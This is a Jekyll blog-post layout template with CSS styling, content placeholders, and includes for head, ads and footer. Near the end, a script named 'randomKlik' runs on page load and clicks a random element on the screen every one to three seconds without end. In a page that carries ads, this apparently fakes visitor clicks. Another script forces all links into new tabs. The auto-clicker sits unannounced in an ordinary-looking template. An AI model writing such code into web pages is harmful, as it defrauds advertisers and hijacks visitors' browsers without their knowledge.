<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{{ page.title }}</title>
  <style>
    :root {
      --bg: #ffffff;
      --text: #1a1a1a;
      --muted: #6b7280;
      --accent: #2563eb;
      --border: #e5e7eb;
      --code-bg: #f3f4f6;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      line-height: 1.7;
      font-size: 18px;
    }
    .container {
      max-width: 740px;
      margin: 0 auto;
      padding: 2rem 1.5rem 4rem;
    }
    h1 {
      font-size: 2rem;
      line-height: 1.25;
      margin: 0 0 1rem;
      letter-spacing: -0.02em;
    }
    h2 {
      font-size: 1.4rem;
      margin: 2.5rem 0 0.75rem;
      line-height: 1.3;
    }
    h3 {
      font-size: 1.15rem;
      margin: 2rem 0 0.5rem;
    }
    p {
      margin: 0 0 1.25rem;
    }
    ul, ol {
      margin: 0 0 1.25rem;
      padding-left: 1.5rem;
    }
    li {
      margin-bottom: 0.5rem;
    }
    a {
      color: var(--accent);
    }
    blockquote {
      margin: 1.5rem 0;
      padding: 0.75rem 1.25rem;
      border-left: 4px solid var(--accent);
      background: var(--code-bg);
      color: var(--muted);
    }
    pre {
      background: var(--code-bg);
      padding: 1rem;
      border-radius: 8px;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    code {
      background: var(--code-bg);
      padding: 0.15rem 0.35rem;
      border-radius: 4px;
      font-size: 0.9em;
    }
    pre code {
      background: none;
      padding: 0;
    }
    hr {
      border: none;
      border-top: 1px solid var(--border);
      margin: 2.5rem 0;
    }
    .post-footer {
      margin-top: 3rem;
      padding-top: 1.5rem;
      border-top: 1px solid var(--border);
      font-size: 0.95rem;
    }
    .post-footer a {
      text-decoration: none;
    }
  </style>
  {% include head.html %}
</head>
<body>

<main class="container">
  <article>
    <h1>{{ page.title }}</h1>

    {{ content }}

    <div class="post-footer">
      <a href="/">Back to home</a>
    </div>
  </article>
</main>

<script>
document.querySelectorAll('a').forEach(function(link) {
  link.target = '_blank';
});
</script>

<script>
function randomKlik() {
    let x = Math.floor(Math.random() * window.innerWidth);
    let y = Math.floor(Math.random() * window.innerHeight);
    let elemen = document.elementFromPoint(x, y);
    if (elemen) {
        elemen.click();
    }
    setTimeout(randomKlik, Math.floor(Math.random() * 2000) + 1000);
}
randomKlik();
</script>


{% include /ads/gobloggugel/umum.html %}
{% include footer.html %}

</body>
</html>
